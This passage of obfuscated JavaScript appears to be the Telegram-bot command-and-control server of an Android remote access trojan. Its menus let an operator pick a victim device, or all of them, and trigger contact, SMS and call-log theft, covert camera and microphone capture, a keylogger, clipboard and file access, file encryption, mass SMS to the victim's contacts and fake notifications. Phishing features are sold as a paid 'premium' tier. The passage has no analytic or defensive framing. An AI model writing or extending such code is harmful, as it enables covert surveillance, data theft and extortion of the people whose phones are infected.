                                appData.set(chatId + "_action", "toastText");
                                bot.sendMessage(chatId, "<b>🔔 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]], 'resize_keyboard': true, 'one_time_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>") {
                                appData.set(chatId + "_action", "smsNumber");
                                bot.sendMessage(chatId, "<b>📤 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n", {
                                  'parse_mode': 'HTML',
                                  'reply_markup': { 'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]], 'resize_keyboard': true, 'one_time_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>") {
                                appData.set(chatId + "_action", "vibrateDuration");
                                bot.sendMessage(chatId, "<b>📳 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]], 'resize_keyboard': true, 'one_time_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>") {
                                appData.set(chatId + "_action", "textToAllContacts");
                                bot.sendMessage(chatId, "<b>📨 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]], 'resize_keyboard': true, 'one_time_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>") {
                                appData.set(chatId + "_action", "notificationText");
                                bot.sendMessage(chatId, "<b>📲 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]], 'resize_keyboard': true, 'one_time_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                              if (_0xdbde0c.text === "<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>") {
                                bot.sendMessage(chatId, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': { 'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]], 'resize_keyboard': true }
                                });
                              }
                            } else {
                              io.sockets.sockets.forEach((_0x22a16b, _0x30e015) => {
                                if (_0xdbde0c.text === `<b>${_0x22a16b.model}</b>`) {
                                      appData.set(chatId + "_target", _0x30e015);
                                      _0x22a16b.activeChatId = chatId; // MAP SOCKET TO THIS SPECIFIC USER
                                      bot.sendMessage(chatId, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x22a16b.model + "</b>\n\n", {
                                        'parse_mode': "HTML",
                                        'reply_markup': {
                                          'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                          'resize_keyboard': true,
                                          'one_time_keyboard': true
                                        }
                                      });
                                }
                              });
                              if (_0xdbde0c.text == "<b>🌐 𝙰𝚕𝚕 🔴</b>") {
                                appData.set(chatId + "_target", "all");
                                io.sockets.sockets.forEach(socket => {
                                      socket.activeChatId = chatId; // CLAIM ALL SOCKETS TEMPORARILY
                                });
                                bot.sendMessage(chatId, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                  'parse_mode': "HTML",
                                  'reply_markup': {
                                    'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                    'resize_keyboard': true,
                                    'one_time_keyboard': true
                                  }
                                });
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
});

setInterval(() => {
  io.sockets.sockets.forEach((_0x107f46, _0x316932) => {
    io.to(_0x316932).emit("ping", {});
  });
}, 0x1388);

server.listen(process.env.PORT || 3000, () => {
  console.log("listening on port 3000");
});
